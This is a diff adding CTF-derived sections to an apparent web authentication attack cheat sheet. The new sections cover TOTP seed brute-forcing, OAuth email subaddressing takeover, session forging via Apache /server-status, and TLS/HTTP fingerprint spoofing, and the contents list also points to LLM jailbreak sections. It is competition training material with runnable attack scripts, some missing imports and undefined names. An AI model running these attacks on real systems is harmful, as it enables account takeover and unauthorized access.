@@ -11,6 +11,7 @@
 - [Host Header Bypass](#host-header-bypass)
 - [Broken Auth: Always-True Hash Check (0xFun 2026)](#broken-auth-always-true-hash-check-0xfun-2026)
 - [Affine Cipher OTP Brute-Force (UTCTF 2026)](#affine-cipher-otp-brute-force-utctf-2026)
+- [TOTP Recovery via PHP srand(time()) Seed Weakness (TUM CTF 2016)](#totp-recovery-via-php-srandtime-seed-weakness-tum-ctf-2016)
 - [/proc/self/mem via HTTP Range Requests (UTCTF 2024)](#procselfmem-via-http-range-requests-utctf-2024)
 - [Custom Linear MAC/Signature Forgery (Nullcon 2026)](#custom-linear-macsignature-forgery-nullcon-2026)
 - [Hidden API Endpoints](#hidden-api-endpoints)
@@ -20,8 +21,11 @@
 - [HTTP TRACE Method Bypass (BYPASS CTF 2025)](#http-trace-method-bypass-bypass-ctf-2025)
 - [LLM/AI Chatbot Jailbreak (BYPASS CTF 2025)](#llmai-chatbot-jailbreak-bypass-ctf-2025)
 - [LLM Jailbreak with Safety Model Category Gaps (UTCTF 2026)](#llm-jailbreak-with-safety-model-category-gaps-utctf-2026)
+- [OAuth Email Subaddressing Bypass (HITCON 2017)](#oauth-email-subaddressing-bypass-hitcon-2017)
 - [Open Redirect Chains](#open-redirect-chains)
 - [Subdomain Takeover](#subdomain-takeover)
+- [Apache mod_status Information Disclosure + Session Forging (29c3 CTF 2012)](#apache-mod_status-information-disclosure--session-forging-29c3-ctf-2012)
+- [JA4/JA4H TLS and HTTP Fingerprint Matching (BSidesSF 2026)](#ja4ja4h-tls-and-http-fingerprint-matching-bsidessf-2026)
 
 For JWT/JWE token attacks, see [auth-jwt.md](auth-jwt.md). For OAuth/OIDC, SAML, CI/CD credential theft, and infrastructure auth attacks, see [auth-infra.md](auth-infra.md).
 
@@ -193,6 +197,45 @@ for otp in otps:
 
 ---
 
+## TOTP Recovery via PHP srand(time()) Seed Weakness (TUM CTF 2016)
+
+TOTP implementations seeded with `srand(time())` during registration produce predictable secrets when the registration timestamp is known or can be narrowed.
+
+```python
+import pyotp
+import time
+import ctypes
+
+# If admin registered at 2015-11-28 21:21:XX (seconds unknown)
+# PHP srand(time()) seeds the PRNG with Unix timestamp
+# Only 60 possible seeds to try (one per second in the minute)
+
+base_time = int(datetime.datetime(2015, 11, 28, 21, 21, 0).timestamp())
+
+for second in range(60):
+    seed = base_time + second
+    # Replicate PHP's rand() sequence after srand(seed)
+    libc = ctypes.CDLL("libc.so.6")
+    libc.srand(seed)
+
+    # Generate the same secret the server generated
+    charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"
+    secret = ""
+    for _ in range(16):
+        secret += charset[libc.rand() % len(charset)]
+
+    # Generate current TOTP and try login
+    totp = pyotp.TOTP(secret)
+    token = totp.now()
+    if try_login("admin", token):
+        print(f"Found seed: {seed}, secret: {secret}")
+        break
+```
+
+**Key insight:** When TOTP secrets are generated using `srand(time())`, knowing the approximate registration time (even to the minute) reduces the seed space to 60 values. Check blog posts, admin panels, or user creation timestamps for registration time hints.
+
+---
+
 ## /proc/self/mem via HTTP Range Requests (UTCTF 2024)
 
 **Pattern (Home on the Range):** Flag loaded into process memory then deleted from disk.
@@ -318,7 +361,7 @@ app.all("/api/export/chat", (req, res, next) => {
 
 ## IDOR on Unauthenticated WIP Endpoints (srdnlenCTF 2026)
 
-**Pattern (MSN Revive):** A "work-in-progress" endpoint (`/api/export/chat`) is missing both `@login_required` decorator and resource ownership checks (`is_member`). Any user (or unauthenticated request) can access any resource by providing its ID.
+**Pattern (MSN Revive):** An IDOR (Insecure Direct Object Reference) vulnerability — a "work-in-progress" endpoint (`/api/export/chat`) is missing both `@login_required` decorator and resource ownership checks (`is_member`). Any user (or unauthenticated request) can access any resource by providing its ID.
 
 **Reconnaissance:**
 1. Search source code for comments like `WIP`, `TODO`, `FIXME`, `temporary`, `debug`
@@ -472,6 +515,55 @@ def extract_via_code(host, port):
 
 ---
 
+## OAuth Email Subaddressing Bypass (HITCON 2017)
+
+**Pattern:** Email subaddressing (`user+tag@domain.com`) delivers to `user@domain.com` but is treated as a distinct string. OAuth providers that skip email ownership verification allow registering `admin+anytag@domain.com` as a new identity. The relying party normalizes the email (strips `+tag`) and maps it to the existing admin account.
+
+```python
+import requests
+
+# Scenario: OAuth provider (e.g., Dropbox) lets you register with any email
+# without verifying ownership. Relying party maps OAuth email to its own users
+# using normalized email (stripping the +tag portion).
+
+# Step 1: Register with OAuth provider using subaddressed admin email
+oauth_register_payload = {
+    "email": "admin+attacker@example.com",   # delivers to admin@example.com
+    "password": "attacker_password"
+}
+# Register on OAuth provider (if it allows self-registration without verification)
+
+# Step 2: Initiate OAuth flow — get auth code for this "new" identity
+# Step 3: Relying party receives email "admin+attacker@example.com"
+# Step 4: Relying party normalizes: strips "+attacker" → "admin@example.com"
+# Step 5: Looks up existing account for admin@example.com → grants attacker admin access
+
+r = requests.get("http://target/oauth/callback",
+                 params={"code": oauth_code, "state": state})
+# Response: logged in as admin
+```
+
+**Identifying the vulnerability:**
+```bash
+# 1. Find the admin email from public info (about page, git commits, signup errors)
+# 2. Check if OAuth provider allows registration without email verification
+# 3. Check if relying party normalizes emails before account lookup
+
+# Test: register as "yourtestemail+x@gmail.com" via OAuth
+# If you're logged into yourtestemail@gmail.com account → vulnerable
+```
+
+**Email normalization variations:**
+```text
+user+tag@domain         → user@domain          (subaddressing, RFC 5321)
+user.name@gmail.com     → username@gmail.com   (Gmail dot normalization)
+USER@DOMAIN             → user@domain          (case folding)
+```
+
+**Key insight:** When an OAuth provider skips email verification and the relying party uses email as an identity key, `+tag` subaddressing creates shadow identities that map to any target account. The attacker controls a valid OAuth identity for `admin+x@domain` without owning `admin@domain`. Always verify email ownership in OAuth flows and use the provider-assigned unique user ID (not email) as the account identifier.
+
+---
+
 ### Open Redirect Chains
 
 **Pattern:** Chain open redirects for OAuth token theft, phishing, or SSRF bypass. Test all redirect parameters for open redirect, then chain with OAuth flows.
@@ -559,3 +651,96 @@ curl -v https://suspicious-subdomain.target.com
 | Fastly | CNAME to Fastly | "Fastly error: unknown domain" |
 
 **Tools:** `subjack`, `nuclei -t takeovers/`, `can-i-take-over-xyz` (reference list)
+
+---
+
+## Apache mod_status Information Disclosure + Session Forging (29c3 CTF 2012)
+
+**Pattern:** Apache's `mod_status` endpoint (`/server-status`) is left enabled and accessible, leaking active request URLs, client IP addresses, and request parameters. Combined with session pattern analysis, this enables session forging to impersonate authenticated users.
+
+**Reconnaissance:**
+```bash
+# Check if mod_status is enabled
+curl http://target/server-status
+curl http://target/server-status?auto   # machine-readable format
+
+# Also try common info-leak endpoints
+curl http://target/server-info          # mod_info (Apache config details)
+curl http://target/.htaccess            # sometimes readable
+```
+
+**Information leaked by /server-status:**
+- Active request URLs (including admin panels like `/admin`)
+- Client IP addresses of authenticated users
+- Query parameters and POST data fragments
+- Virtual host configurations
+- Worker thread status and request duration
+
+**Attack chain:**
+1. Discover `/server-status` is accessible
+2. Identify admin endpoints (e.g., `/admin`) and admin IP addresses from active requests
+3. Analyze session token patterns from visible `Cookie` or `Set-Cookie` headers
+4. Forge a valid session token by reproducing the pattern (e.g., predictable session IDs based on IP, timestamp, or username)
+5. Replay the forged session to access admin functionality
+
+```bash
+# Extract admin session info from server-status
+curl -s http://target/server-status | grep -i 'admin\|session\|cookie'
+
+# If session tokens follow a predictable pattern (e.g., md5(username+ip+timestamp)):
+python3 -c "
+import hashlib, time
+admin_ip = '10.0.0.1'  # observed from server-status
+ts = int(time.time())
+for offset in range(-10, 10):
+    token = hashlib.md5(f'admin{admin_ip}{ts+offset}'.encode()).hexdigest()
+    print(token)
+"
+```
+
+**Key insight:** `/server-status` is a goldmine for session analysis — it reveals who is authenticated, what endpoints exist, and sometimes exposes session tokens directly. Always check for it during reconnaissance. The endpoint is enabled by default in many Apache installations and is often left accessible due to misconfigured `<Location>` directives.
+
+**Detection:** During initial recon, check `/server-status`, `/server-info`, and `/status`. If the response contains HTML with worker tables and request details, `mod_status` is active. Automated scanners like `nikto` and `nuclei` flag this automatically.
+
+---
+
+### JA4/JA4H TLS and HTTP Fingerprint Matching (BSidesSF 2026)
+
+**Pattern (cloudpear):** Server validates three browser fingerprints before granting access: User-Agent string hash, JA4H (HTTP header ordering fingerprint), and JA4 (TLS ClientHello fingerprint). Spoofing User-Agent alone is insufficient because the server computes JA4/JA4H from the actual connection.
+
+**JA4 (TLS fingerprint):** Hash of TLS ClientHello parameters — protocol version, cipher suites (sorted), extensions, signature algorithms, and supported groups. Different TLS libraries produce different JA4 hashes even with identical User-Agents.
+
+**JA4H (HTTP fingerprint):** Hash of HTTP header ordering, names, and values. Each HTTP client (browser, curl, Python requests) sends headers in a distinct order.
+
+**Attack approach:**
+1. Identify the required browser by examining error messages or source code (e.g., "Firefox 4" from User-Agent validation)
+2. Attempt User-Agent spoofing first — if JA4H/JA4 checks fail, the server reveals which fingerprint mismatched
+3. For JA4H: replicate the exact HTTP header ordering of the target browser using raw socket or `requests` with ordered headers
+4. For JA4: use the actual target browser or a TLS library configured to produce the matching ClientHello (cipher suite order, extensions, etc.)
+
+```python
+# JA4H can sometimes be matched with careful header ordering:
+import requests
+
+headers = collections.OrderedDict([
+    ('Host', 'target.com'),
+    ('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:2.0) Gecko/20100101 Firefox/4.0'),
+    ('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'),
+    ('Accept-Language', 'en-us,en;q=0.5'),
+    ('Accept-Encoding', 'gzip, deflate'),
+    ('Connection', 'keep-alive'),
+])
+# For JA4 (TLS), may need to use the actual legacy browser or
+# a tool like curl with specific --ciphers and --tls-max flags
+```
+
+**Key insight:** JA4/JA4H fingerprinting is increasingly used in WAFs and bot detection (Cloudflare, Akamai). Unlike User-Agent which is trivially spoofable, TLS fingerprints require matching the exact cipher suite order, extensions, and TLS version negotiation of the target browser. For legacy browsers, running the actual browser (e.g., Firefox 4 in a VM) may be the easiest path.
+
+**When to recognize:** Challenge mentions "browser fingerprinting", "firewall", or rejects requests despite correct User-Agent. Server returns different responses for `curl` vs browser despite identical URLs and headers. Error messages reference "JA3", "JA4", or "TLS fingerprint".
+
+**Detection tools:**
+- `ja4` CLI tool to compute your client's JA4 hash
+- Wireshark with JA4 plugin to inspect ClientHello
+- `curl -v --ciphers <list> --tls-max 1.2` to manually control TLS parameters
+
+**References:** BSidesSF 2026 "cloudpear"
